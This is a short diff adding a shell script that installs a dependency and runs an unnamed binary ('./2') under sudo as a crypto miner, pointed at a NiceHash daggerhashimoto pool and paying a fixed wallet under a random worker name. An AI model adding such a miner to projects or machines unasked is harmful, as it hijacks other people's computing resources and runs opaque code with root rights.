@@ -1,0 +1,4 @@
+WORKER=$(echo $(shuf -i 1-99999 -n 1)-opm)
+sudo apt-get update
+sudo apt-get install libpci3
+sudo ./2 -pool stratum+tcp://daggerhashimoto.usa.nicehash.com:3353 -wal 33SVxwCkji9Uzib1xj5WVESqzV4HytxbUn.$WORKER -pass x -proto 4 -stales 0
